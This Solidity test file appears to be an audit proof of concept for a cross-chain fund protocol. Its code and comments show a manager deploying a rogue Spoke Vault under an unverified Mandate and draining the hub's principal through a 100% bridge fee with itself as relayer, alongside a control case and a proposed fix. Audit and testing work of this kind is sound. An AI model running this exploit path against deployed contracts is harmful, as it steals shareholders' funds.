// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
import {IFundFactory} from "../../../src/interfaces/IFundFactory.sol";
import {ISpokeVault} from "../../../src/interfaces/ISpokeVault.sol";
import {IAcrossSpokePool} from "../../../src/interfaces/external/IAcrossSpokePool.sol";
import {FundFactory} from "../../../src/factory/FundFactory.sol";
import {CoreVault} from "../../../src/core/CoreVault.sol";
import {SpokeVault} from "../../../src/spoke/SpokeVault.sol";
import {Transit, TransferKind} from "../../../src/interfaces/FundTypes.sol";
import {TransitMessage} from "../../../src/libraries/TransitMessage.sol";
import {Mandate, MandateLib} from "../../../src/mandate/Mandate.sol";
import {AccessFundFixture} from "./AccessFundFixture.sol";

/// @title PoC: the manager creates the fund's Spoke Vault from a Mandate the hub never saw and takes everything the
///        hub sends there
/// @notice ATTACK. `FundFactory.createSpoke` derives the fund id from `(Mandate.hubChainId, creationNumber,
///         Mandate.manager)` and compares the Mandate only with a `mandateHash` the caller supplies
///         (FundFactory.sol:190-198), so nothing ties the spoke's rules to the hub's. The manager creates the hub fund
///         with a reasonable Mandate (bridge fee capped at 0.5%), then creates the spoke AT THE ADDRESS THE HUB'S
///         MANDATE NAMES from another Mandate with `maxBridgeFeeBps = 10,000`. The Core Vault bridges principal to that
///         address (CoreVaultLogic.sol:683) and the ValueReportReceiver accepts its reports (emitter check only,
///         ValueReportReceiver.sol:152). The manager then calls `sendToHub(everything, outputAmount = 1)` with itself
///         as exclusive relayer: the 100% fee passes the spoke's own check (SpokeCrossChainLib.sol:215-223), the
///         manager fills 1 base unit on the hub and Across repays it the whole input. A pool list with a pool the
///         manager controls works the same way through `swapExactInput`.
/// @notice IMPACT. Theft of all principal the hub sends to the spoke, up to the Spoke Cap. The residual is listed as
///         a known limit (FF-OQ-1, docs/DEPLOYMENT.md: "check that the spoke's mandateHash() equals the hub's" and
///         test/unit/factory/FundFactoryVerifyRound2.t.sol), but that check is off-chain, optional and cannot protect
///         a shareholder who deposited before the spoke existed: the manager creates the spoke and sends in the same
///         minute. This PoC shows the limit is a theft path, and the control shows the hub's Mandate would have
///         stopped it.
/// @notice FIX (no hub-to-spoke message needed). Put the Spoke Vault's `mandateHash` in the value report (ReportCodec)
///         and have the ValueReportReceiver reject a report whose hash differs from the Core Vault's; then have
///         `sendToSpoke` require an accepted report from that spoke. The hub never funds a spoke whose rules it has
///         not verified. The full fix of FF-OQ-1 (the hub's `FundCreated` verified by the spoke factory) also works.
contract RogueSpokeMandatePoC is AccessFundFixture {
    /// @dev What the hub knows, carried across the chain switch in memory.
    struct Hub {
        bytes32 fundId;
        address coreVault;
        bytes32 mandateHash;
        address namedSpokeVault;
    }

    function test_POC_managerDrainsTheSpokeThroughAMandateTheHubNeverSaw() public {
        // Hub: the fund investors see. Bridge fee capped at 0.5%.
        Hub memory hub = _hubFund();

        // Spoke chain.
        FundFactory spokeFactory = _spokeFactory();
        assertEq(spokeFactory.fundIdOf(HUB, 1, manager), hub.fundId, "same factory address, same fund id");

        // Control: a spoke created from the hub's Mandate refuses the send below.
        uint256 snapshot = vm.snapshotState();
        SpokeVault honest = _createSpoke(spokeFactory, hub.fundId, _plan());
        assertEq(honest.mandateHash(), hub.mandateHash);
        _arrive(honest, hub.fundId, 500_000e6);
        vm.prank(manager);
        vm.expectPartialRevert(ISpokeVault.BridgeFeeAboveMax.selector);
        honest.sendToHub(499_990e6, TransferKind.Principal, 0, _quote(1, manager));
        vm.revertToState(snapshot);

        // The manager's spoke: same fund id, same address, another Mandate.
        FundPlan memory roguePlan = _plan();
        roguePlan.maxBridgeFeeBps = 10_000;
        SpokeVault spoke = _createSpoke(spokeFactory, hub.fundId, roguePlan);
        assertEq(address(spoke), hub.namedSpokeVault, "the hub's bridge recipient and report emitter");
        assertTrue(spoke.mandateHash() != hub.mandateHash, "rules the hub's Mandate never showed");
        assertEq(spoke.coreVault(), hub.coreVault);

        // The hub sends 500,000 of principal (the fill, as the Across SpokePool delivers it).
        _arrive(spoke, hub.fundId, 500_000e6);
        uint256 amount = spoke.unallocatedBalance(address(usdg));
        assertEq(amount, 499_990e6);

        // The manager sends all of it "home" for 1 base unit of USDC, itself as exclusive relayer.
        bytes32 transitId = keccak256(abi.encode(hub.fundId, SPOKE, uint256(1)));
        _expectDeposit(spoke, hub.coreVault, transitId, amount);
        vm.prank(manager);
        assertEq(spoke.sendToHub(amount, TransferKind.Principal, 0, _quote(1, manager)), transitId);

        Transit memory t = spoke.hubBoundTransit(transitId);
        assertEq(t.amountSent, 499_990e6);
        assertEq(t.amountToArrive, 1, "the fund will receive one millionth of a USDC");
        assertEq(spoke.unallocatedBalance(address(usdg)), 0);
        assertEq(_balance(usdg, address(spokeAcross)), amount, "the principal waits for the relayer's repayment");

        // Across settlement, modelled (the mock pool has no relayer leg): the exclusive relayer pays 1 base unit of
        // USDC to the Core Vault on the hub and is repaid the input amount on the origin chain.
        vm.prank(address(spokeAcross));
        usdg.transfer(manager, amount);
        assertEq(_balance(usdg, manager), 499_990e6, "the manager holds the fund's principal");
    }

    function _hubFund() internal returns (Hub memory hub) {
        (IFundFactory.FundAddresses memory a, Mandate memory m) = _createFund(_plan());
        assertEq(m.maxBridgeFeeBps, 50);
        hub.fundId = a.fundId;
        hub.coreVault = a.coreVault;
        hub.mandateHash = CoreVault(a.coreVault).mandateHash();
        hub.namedSpokeVault = address(uint160(uint256(m.spokes[0].spokeVault)));
    }

    /// @dev The exact Across deposit the Spoke Vault is about to make: USDG in, 1 unit of USDC out, the manager as
    ///      exclusive relayer.
    function _expectDeposit(SpokeVault spoke, address coreVault, bytes32 transitId, uint256 amount) internal {
        address escrow =
            Clones.predictDeterministicAddress(spoke.transitEscrowImplementation(), transitId, address(spoke));
        vm.expectCall(
            address(spokeAcross),
            abi.encodeWithSelector(
                IAcrossSpokePool.depositV3.selector,
                escrow,
                coreVault,
                address(usdg),
                address(usdc),
                amount,
                uint256(1),
                HUB,
                manager
            )
        );
    }

    function _createSpoke(FundFactory spokeFactory, bytes32 fundId, FundPlan memory plan)
        internal
        returns (SpokeVault)
    {
        Mandate memory m = _buildMandate(spokeFactory, fundId, plan);
        vm.prank(manager);
        IFundFactory.ChainAddresses memory c = spokeFactory.createSpoke(1, m, _spokeParams(MandateLib.hash(m), plan));
        return SpokeVault(c.spokeVault);
    }

    /// @dev A relayer fill of a hub-to-spoke send: the SpokePool transfers the base token, then calls the handler.
    function _arrive(SpokeVault spoke, bytes32 fundId, uint256 amount) internal {
        usdg.mint(address(spoke), amount);
        vm.prank(address(spokeAcross));
        spoke.handleV3AcrossMessage(
            address(usdg),
            amount,
            stranger,
            TransitMessage.encode(fundId, HUB, keccak256("hub transit 1"), TransferKind.Principal)
        );
    }
}
